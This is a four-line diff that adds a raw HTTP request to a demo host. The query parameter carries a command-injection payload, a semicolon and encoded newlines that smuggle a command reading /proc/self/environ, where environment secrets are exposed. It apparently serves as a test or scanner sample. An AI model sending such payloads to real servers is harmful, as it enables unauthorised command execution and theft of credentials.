@@ -1,0 +1,4 @@
+GET /a?s=;%0acat%0a/proc/self/environ HTTP/1.1
+Host: demo.example.com
+Connection: close
+
